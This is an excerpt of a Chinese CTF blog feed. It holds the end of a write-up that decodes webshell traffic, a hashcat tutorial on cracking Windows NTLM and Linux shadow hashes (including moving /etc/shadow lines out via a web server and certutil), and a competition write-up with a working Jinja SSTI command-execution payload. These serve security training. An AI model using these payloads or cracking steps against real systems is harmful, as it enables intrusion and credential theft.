&quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 定义正则表达式模式</span><br><span class="line">pattern = re.compile(r&#x27;lFDu8RwONqmag5ex45089b3446ee(.*?)4e0d86dbcf92&#x27;)</span><br><span class="line"></span><br><span class="line"># 提取并打印结果</span><br><span class="line">for string in strings:</span><br><span class="line">    match = pattern.search(string)</span><br><span class="line">    if match:</span><br><span class="line">        extracted_string = match.group(1)</span><br><span class="line">        print(f&quot;Extracted: &#123;extracted_string&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;No match found in: &#123;string&#125;&quot;)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>反解$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$k=&quot;161ebd7d&quot;;$kh=&quot;45089b3446ee&quot;;$kf=&quot;4e0d86dbcf92&quot;;$p=&quot;lFDu8RwONqmag5ex&quot;;</span><br><span class="line">function x($t,$k)&#123;</span><br><span class="line">  $c=strlen($k);$l=strlen($t);$o=&quot;&quot;;</span><br><span class="line">  for($i=0;$i&lt;$l;)&#123;</span><br><span class="line">    for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $o.=$t[$i]^$k[$j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r=array(&quot;SaoCUFRXAGExNS5kaQ==&quot;,&quot;SaoCUVRSBofUNDFgR2Uu&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6KU+uuy3+Gn+oqy3SgTM2GBxmng==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Saq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($r);$i++) &#123;</span><br><span class="line">    $decr=gzuncompress(x(base64_decode($r[$i]),$k));</span><br><span class="line">    print($decr);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118153433654.png" alt="image-20250118153433654"></p><blockquote><p>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.18</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hashcat常规使用方法</title>
    <link href="https://m3x1.cn/posts/7ca0c84c.html"/>
    <id>https://m3x1.cn/posts/7ca0c84c.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.835Z</updated>
    
    <content type="html"><![CDATA[<h3 id="m-hash的类型"><a href="#m-hash的类型" class="headerlink" title="-m hash的类型"></a>-m hash的类型</h3><p>指定hash的加密类型，默认是MD5类型<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151218880-546683178.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151218880-546683178.png" alt="img"></a><br>在对应的类型前面有它的id,可以通过id来指定类型<br>当我们想要找一个类型在<code>hashcat</code>支不支持的时候，例如windows系统加密的是NTML,可以执行命令<br><code>hashcat64.exe -h | findstr NTLM</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151441885-831306097.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151441885-831306097.png" alt="img"></a><br>可以看到<code>NTLM</code>的ID号为<code>1000</code></p><h3 id="a-攻击方式"><a href="#a-攻击方式" class="headerlink" title="-a 攻击方式"></a>-a 攻击方式</h3><p>破解密码的方式<br>分别有:</p><p>highlighter- 1c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight  字典破解</span><br><span class="line">1 | Combination  组合破解</span><br><span class="line">3 | Brute-force  掩码破解</span><br><span class="line">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class="line">7 | Hybrid Mask + Wordlist  混合掩码 +  字典</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323150232206-1864847787.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323150232206-1864847787.png" alt="img"></a></p><h3 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h3><p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，首先我们知道密码有多少位<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323153207489-2145128247.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323153207489-2145128247.png" alt="img"></a><br>例如:<code>?d?d?d?d?d?d?d?d</code>代表密码为8为数字，<code>?u?l?l?l?l?d?d?d</code>代表密码为7位，首个字母大写，然后四个小写字母，最后三个数字</p><h3 id="破解windows-hash密码"><a href="#破解windows-hash密码" class="headerlink" title="破解windows hash密码"></a>破解windows hash密码</h3><p><strong>使用字典爆破windows hash</strong><br><code>hashcat64.exe -a 0 -m 1000 hash或者hashfile 字典文件</code><br>准备好我们的密码本，这里我使用的是手写的<code>2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152446755-1468474769.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152446755-1468474769.png" alt="img"></a><br><code>hashcat64.exe -a 0 -m 1000 e45a314c664d40a227f9540121d1a29d 2.txt</code><br>执行后会进入这样一个状态，这里每个可能不一样，在破解成功或者跑完字典后会自动停止<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152907726-1543846375.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152907726-1543846375.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152938264-999245190.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152938264-999245190.png" alt="img"></a><br>可以看到我们的密码已经被破解出来，为<code>Admin123</code><br>在破解后，会在根目录下的<code>hashcat.potfile</code>文件记录这个hash的缓存<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323154735555-892319052.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323154735555-892319052.png" alt="img"></a></p><p><strong>使用掩码破解windows hash</strong><br><code>hashcat64.exe -a 3 -m 1000 e45a314c664d40a227f9540121d1a29d ?u?l?l?l?l?d?d?d</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155148658-906395823.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155148658-906395823.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155209806-1669173198.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155209806-1669173198.png" alt="img"></a><br>破解成功</p><p>在我们爆破的同时，会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure><p>分别：查看破解状态，暂停，绕过，检查，退出</p><p>还有如下例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118140015954.png" alt="image-20250118140015954"></p><h3 id="破解Linux-hash密码"><a href="#破解Linux-hash密码" class="headerlink" title="破解Linux hash密码"></a>破解Linux hash密码</h3><p>在<code>linux</code>中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323193627170-854468310.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323193627170-854468310.png" alt="img"></a><br>将root和jackson用户的密码保存到<code>/var/www/html/pass</code>Web服务目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$90/diajJs2fHcIGa$hB5wj4tMF8Qdd6o5VNRTY4v4vEpV8x0NP4O1N/tpJ8ns7JmJ8RyvSih7.W8TQdfwweUFh16dJejFpKw07i2uR1::0:99999:7:::</span><br><span class="line">jackson:$6$Zje1WaoS$eH24JFr5n67149yBcDWWsfxME5cYlOXMmJxnf2uinbvYm8vWc0BmjvAoXIFY/0ZUJItRpPhHkCGDiqjXT10EV0:19066:0:99999:7:::</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220324083051894-306061497.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220324083051894-306061497.png" alt="img"></a><br>注意这里的换行，一个用户的hash值是一行<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195519376-1688604181.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195519376-1688604181.png" alt="img"></a><br>启动Web服务<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195250088-790012495.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195250088-790012495.png" alt="img"></a><br>并在实验机器下载，这里使用certutil将pass文件内容下载到了D盘下的pass文件中去<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323194800417-621412828.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323194800417-621412828.png" alt="img"></a><br><strong>Linux使用的是 sha512crypt加密方式</strong>，在hashcat中寻找是否有该方法<br><code>hashcat64.exe -h|findstr sha512crypt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195736516-1164859720.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195736516-1164859720.png" alt="img"></a><br>代号为<code>1800</code><br>继续使用我们的<code>2.txt</code>对<code>d:\pass</code>文件进行暴力破解<br><code>hashcat64.exe -a 0 -m 1800 d:\pass 2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323200929852-624191296.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323200929852-624191296.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323201016538-1015617615.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323201016538-1015617615.png" alt="img"></a><br>这里我更换了<code>root</code>和<code>jackson</code>用户在文件中的位置<br>爆破成功，得到<code>jackson</code>的密码为<code>root</code>，但是只爆破出了一个密码，应该只支持一个密码的破解<br><strong><code>注意:复制的时候一定不要有换行，不然是无法破解成功的</code></strong></p>]]></content>
    
    
    <summary type="html">🥧hashcat常规使用方法</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.17</title>
    <link href="https://m3x1.cn/posts/b245cfb0.html"/>
    <id>https://m3x1.cn/posts/b245cfb0.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-01-21T06:20:34.450Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><blockquote><p>考点：ssti 注入</p></blockquote><p>打开网页，发现有个登录，试试直接登录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165333225.png" alt="image-20250117165333225"></p><p>看到 url 处是进行 get 传参，试试 111</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165407490.png" alt="image-20250117165407490"></p><p>联想到 ssti 漏洞，于是用9验证一下，发现就是 ssti 模板注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165456193.png" alt="image-20250117165456193"></p><p>进行 ssti 模板注入漏洞一系列，构造 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165555735.png" alt="image-20250117165555735"></p><blockquote><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p></blockquote><h4 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h4><blockquote><p>考点：无回显，filter协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230203872.png" alt="image-20250117230203872"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230233073.png" alt="image-20250117230233073"></p><p>根据代码，可以看到是post传参，参数是path。（抓包也可以看）</p><p>直接使用脚本（<a href="https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main）">https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main）</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230452787.png" alt="image-20250117230452787"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230507242.png" alt="image-20250117230507242"></p><blockquote><p>flag{894272cc-8e8d-47f7-9565-39636508492a}</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="简单算数"><a href="#简单算数" class="headerlink" title="简单算数"></a>简单算数</h4><p>考点：异或</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165811554.png" alt="image-20250117165811554"></p><p>直接进行字符串异或，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165855506.png" alt="image-20250117165855506"></p><blockquote><p>flag{x0r_Brute_is_easy!}</p></blockquote><h4 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics"></a>See anything in these pics</h4><blockquote><p>考点：文件分离</p></blockquote><p>解压后是一个二维码和一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170037763.png" alt="image-20250117170037763"></p><p>扫描二维码，得到解压缩包的密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170129000.png" alt="image-20250117170129000"></p><p>解压后得到一张 jpg 图片。先放进 010editor 看一下，发现隐藏了文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170256270.png" alt="image-20250117170256270"></p><p>用 binwalk 探测，然后提取，得到一张 png 图片</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170348138.png" alt="image-20250117170348138"></p><p>放进 010editor 查看，可能宽高被修改过，于是修改宽高得到原图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170548575.png" alt="image-20250117170548575"></p><blockquote><p>flag{opium_00pium}</p></blockquote><h4 id="简单提取镜像"><a href="#简单提取镜像" class="headerlink" title="简单提取镜像"></a>简单提取镜像</h4><blockquote><p>考点：流量分析，数据修复</p></blockquote><p>解压文件得到一个流量包，进行流量分析，导出文件，得到一个 zip 文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171207275.png" alt="image-20250117171207275"></p><p>解压 zip 文件，得到一个破损的 img 文件，根据提示，可能可以使用 RR-Studio 工具修复。</p><p>可以直接进行文件分离，得到一个 